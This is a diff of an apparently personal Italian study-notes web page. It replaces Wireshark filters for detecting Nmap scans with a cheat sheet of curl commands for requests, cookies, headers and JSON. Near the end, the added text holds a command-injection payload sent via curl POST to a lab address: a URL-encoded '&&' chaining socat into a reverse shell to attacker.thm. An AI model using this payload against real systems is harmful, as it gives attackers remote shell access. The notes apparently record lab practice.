@@ -2,8 +2,8 @@
 <html lang="it">
 <head>
 <meta charset="UTF-8">
-<title>Wireshark Filters</title>
-<meta name="description" content="Wireshark">
+<title>Linux CMD "Extra"</title>
+<meta name="description" content="Extra">
     <meta name="author" content="Massimo">
     <link rel="stylesheet" href="../Styles/Styles.css">
 </head>
@@ -21,65 +21,58 @@
 <!-- Header titolo -->
 <header>
     <div class="line"></div>
-    <h3>Nmap Scans</h3>
+    <h3>Extra Linux CMD</h3>
 </header>
-      
-<div class="sub-container">
-    <h2>Nmap scans:</h2>
-    <p>The most common Nmap scan types:<b> TCP connect scans , SYN scans , UDP scans </b></p>
-    <div class="flex-container">
-        <div class="step-container">
-            <ul>
-                <li><b>Global search:</b> <code>tcp</code> <code>udp</code></li>
-                <li><b>Only SYN flag:</b> <code>tcp.flags == 2 </code> <code>tcp.flags.syn == 1</code></li>
-                <li><b>Only ACK flag:</b> <code>tcp.flags == 16 </code> <code>tcp.flags.ack == 1</code></li>
-                <li><b>Only SYN, ACK flags:</b> <code>tcp.flags == 18 </code> <code>(tcp.flags.syn == 1) and(tcp.flags.ack == 1) </code></li>
-                <li><b>Only RST flag:</b> <code>tcp.flags == 4 </code> <code>tcp.flags.reset == 1</code></li>
-                <li><b>Only RST, ACK flags:</b> <code>tcp.flags == 20 </code> <code>(tcp.flags.reset == 1) and (tcp.flags.ack == 1) </code></li>
-                <li><b>Only FIN flag:</b> <code>tcp.flags == 1 </code> <code>tcp.flags.fin == 1</code></li>                
-            </ul>
-            <h3>TCP Connect Scans</h3>
-            <ul>
-                <li class="mark1">Relies on the three-way handshake (needs to finish the handshake process).</li>
-                <li class="mark1">Usually conducted with nmap -sT command.</li>
-                <li class="mark1">Used by non-privileged users (only option for a non-root user).</li>
-                <li class="mark1">Usually has a windows size larger than 1024 bytes as the request expects some data due to the nature of the protocol.</li>
-            </ul>
-            <ul>
-                <li><b>Open TCP Port:</b> SYN --> / <-- SYN,ACK / ACK --></li>
-                <li><b>Open TCP Port:</b> SYN --> / <-- SYN,ACK / ACK --> / RST,ACK --> </li>
-                <li><b>Close TCP Port:</b> SYN --> / <-- RST, ACK</li>
-                <li><i>This filter shows the TCP Connect scan patterns in a capture file:</i> <code>tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size > 1024</code> </li>
-            </ul>
-            <h3>SYN Scans</h3>
-            <ul>
-                <li class="mark1">Doesn't rely on the three-way handshake (no need to finish the handshake process).</li>
-                <li class="mark1">Usually conducted with nmap -sS command.</li>
-                <li class="mark1">Used by privileged users.</li>
-                <li class="mark1">Usually have a size less than or equal to 1024 bytes as the request is not finished and it doesn't expect to receive data.</li>
-            </ul>
-            <ul>
-                <li><b>Open TCP Port:</b> SYN --> / <-- SYN,ACK / RST --></li>                
-                <li><b>Close TCP Port:</b> SYN --> / <-- RST, ACK</li>
-                <li><i>This filter shows the TCP SYN scan patterns in a capture file:</i> <code>tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size <= 1024</code> </li>
-            </ul>
-        </div>
-        <div class="step-container">
-            <h3>UDP Scans</h3>
-            <ul>
-                <li class="mark1">Doesn't require a handshake process.</li>
-                <li class="mark1">No prompt for open ports</li>
-                <li class="mark1">ICMP error message for close ports</li>
-                <li class="mark1">Usually conducted with nmap -sU command.</li>
-            </ul>
-            <ul>
-                <li><b>Open UDP Port:</b> UDP packet --></li>                
-                <li><b>Close UDP Port:</b> UDP packet --> / <-- ICMP Type 3, Code 3 message. <span class="notePiccole">(Destination unreachable, port unreachable)</span></li>
-                <li><i>This filter shows the UDP scan patterns in a capture file:</i> <code>icmp.type==3 and icmp.code==3</code> </li>
-            </ul>
+<div class="flex-container">
+    
+        <div id="inizio" class="tools-container">
+        <a href="#curl"  class="button-link">curl - browser testuale internet</a>    
 
         </div>
-    </div>
+      
+<div class="sub-container">
+    <h2 id="curl">Curl</h2>      
+<ul>
+    <li><code>curl http://10.82.128.63:8000  </code> - visualizza la pagina html</li>
+    <li><code>curl https://example.com -o pagina.html</code> - salvare una pagina su file</li>
+    <li><code>curl -I https://example.com</code> - vedere solo gli headers, utile per status code (200, 404, 301…), tipo di server, redirect</li>
+    <li><code>curl -L https://example.com</code> - seguire i redirects</li>
+    <li><code>curl -A "Mozilla/5.0" https://example.com</code> - simulare un browser (alcuni siti bloccano le richieste no browser)</li>
+    <li><code>curl "https://example.com/search?q=linux&page=1"</code> - richiesta get con parametri</li>
+    <li><code>curl -X POST -d "user=admin&pass=1234" https://example.com/login </code> - Form classico </li>
+    <li><code>curl -v https://example.com  </code> - vedere richiesta + debug</li>
+</ul>
+<h3>COOKIE</h3>
+<p>Perché salvare i cookie: HTTP è stateless → il server non ricorda nulla di te tra una richiesta e la successiva.
+Il server risponde e fine. Alla richiesta dopo, per il server sei uno nuovo.
+Quindi i cookie sono l’unico modo standard per:<br>
+- mantenere una sessione <br>  - restare loggati <br>- conservare preferenze <br>-superare controlli anti-bot semplici<br>
+esempio cookie:</p>
+<code>curl -c cookie.txt -X POST \
+  -d "user=mario&pass=segretissima" \
+  https://sito.com/login
+</code><br>
+<code>curl -b cookie.txt https://sito.com/dashboard</code><br>
+<code>****<br>
+curl -c cookie.txt https://example.com  --> salvare cookie<br>
+curl -b cookie.txt https://example.com/dashboard     ---> riutilizzarli<br>
+***</code><br>
+<code>
+curl -H "Authorization: Bearer TOKEN" https://example.com/api  --> aggiungere header personalizzati  (Serve a dimostrare al server chi sei quando accedi a una API protetta.)
+</code><br>
+<p>inviare dati post  JSON (API) ---> </p>
+<code>
+curl -X POST https://example.com/api \       
+  -H "Content-Type: application/json" \
+  -d '{"name":"Mario","age":18}'
+</code>
+<p><b>Nota bene:</b> bisogna ricordarsi che su target bisogna usare URL encoded, altrimenti non legge i simboli && = %26%26 , esempio <br>
+    127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh    ----> url encoded= 127%2E0%2E0%2E1%20%26%26%20socat%20TCP%3Aattacker%2Ethm%3A1337%20EXEC%3Ash<br>
+    curl -X POST -d "target=127%2E0%2E0%2E1%26%26%20socat%20TCP%3Aattacker%2Ethm%3A1337%20EXEC%3Ash" http://10.82.128.63:8000<br>
+</p>
+<a href="#inizio"  class="button-link">Torna all'indice!</a>
+<hr>
+     
 </div>
 
 </body>
